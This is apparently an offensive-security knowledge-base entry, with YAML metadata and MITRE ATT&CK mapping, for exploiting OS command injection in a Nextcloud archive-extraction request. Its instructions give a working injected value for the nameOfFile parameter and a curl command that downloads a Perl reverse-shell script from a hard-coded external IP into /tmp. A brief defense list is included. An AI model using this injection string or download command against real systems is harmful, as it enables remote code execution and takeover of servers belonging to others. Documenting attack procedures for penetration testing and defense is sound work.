---
id: proc-inject-download
tags:
  - command-injection
  - download-payload
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-download-shell]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:24:08.689Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Remote File Copy]]'
---
# Inject-Command-to-Download-Reverse-Shell

## Summary

This procedure injects a curl command into the extraction request to download a Perl reverse shell script to the server, exploiting the OS command injection vulnerability.

## Description

By closing the quoted filename and appending a pipe to curl, the exec call runs the injected command alongside unrar. Targets Linux-based Nextcloud. Expected outcome: Payload downloaded without extraction errors.

## Requirements

1. Intercepted extraction request
2. Attacker-controlled server hosting shell.pl
3. Burp Suite

## Defense

Defensive measures and detection strategies:

- Sanitize/escape shell arguments in exec calls
- Disable external downloads via network policies
- Monitor for unexpected curl or file creations in /tmp

## Objectives

1. Inject arbitrary command execution
2. Transfer reverse shell payload to server
3. Prepare for shell execution

## Instructions

### Step 1: Modify nameOfFile Parameter

**Context**: Craft injection to break out of quotes and run curl.

Execute [[commands/curl-download-shell]] via injection:

```bash
curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl
```

> Set nameOfFile to: sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|". Forward request. Expected output: 200 OK response, script saved.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/curl-download-shell]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- command-injection
- download-payload
